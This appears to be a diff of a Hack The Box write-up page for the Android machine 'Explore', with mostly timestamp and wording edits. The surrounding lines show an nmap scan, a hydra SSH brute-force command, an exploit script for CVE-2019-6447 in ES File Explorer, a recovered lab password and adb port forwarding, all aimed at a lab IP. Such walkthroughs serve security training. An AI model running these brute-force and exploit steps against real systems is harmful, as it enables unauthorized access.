@@ -15,7 +15,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-explore/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" />
     <meta property="article:published_time" content="2021-10-30T19:10:00.000Z" />
-    <meta property="article:modified_time" content="2021-10-30T19:10:00.000Z" />
+    <meta property="article:modified_time" content="2021-10-30T19:18:00.000Z" />
     <meta property="article:tag" content="android" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="ssh" />
@@ -63,7 +63,7 @@
     "headline": "HTB Write-up | Explore",
     "url": "inesmartins.github.io/htb-write-up-explore/",
     "datePublished": "2021-10-30T19:10:00.000Z",
-    "dateModified": "2021-10-30T19:10:00.000Z",
+    "dateModified": "2021-10-30T19:18:00.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png",
@@ -681,7 +681,7 @@ PORT     STATE    SERVICE    VERSION
 |_    SSH-2.0-SSH Server - Banana Studio
 | ssh-hostkey: 
 |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
-5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered, which most likely means we'll only be able to access it from inside this machine.</p><p>Let's focus on the other port: the SSH Server application from "Banana Studio" is  <a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (<code>ssh</code> without any password):</p><figure class="kg-card kg-image-card"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let's expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247
+5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered.</p><p>Let's focus on the other port: the <code>SSH</code> Server application from "Banana Studio" is  <a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login ("username=<code>ssh</code> without any password"):</p><figure class="kg-card kg-image-card"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let's expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247
 
 2222/tcp open     ssh     (protocol 2.0)
 | fingerprint-strings: 
@@ -702,7 +702,7 @@ PORT     STATE    SERVICE    VERSION
 [+] Done. Saved as `out.dat`.
 
 ~ htb_explore cat out.dat                                           
-f32017174c7c7e8f50c6da52891ae250</code></pre><hr></hr><h2 id="road-to-root">Road to root</h2><p>Let's continue enumerating using the available commands:</p><pre><code>~ python3 50070.py listPics 10.10.10.247
+f32017174c7c7e8f50c6da52891ae250</code></pre><hr></hr><h2 id="road-to-root">Road to root</h2><p>Let's continue enumerating using the other available commands for this script:</p><pre><code>~ python3 50070.py listPics 10.10.10.247
 
 ==================================================================
 |    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
@@ -718,7 +718,7 @@ size : 1.14 MB (1,200,401 Bytes)
 &gt; Kr1sT!5h@Rp3xPl0r3!
 
 $ whoami
-u0_a76</code></pre><p>Now that we have access to some SSH credentials, let's forward the traffic from the machine's <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
+u0_a76</code></pre><p>Now that we have access to some <code>SSH</code> credentials, let's forward the traffic from the machine's <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 
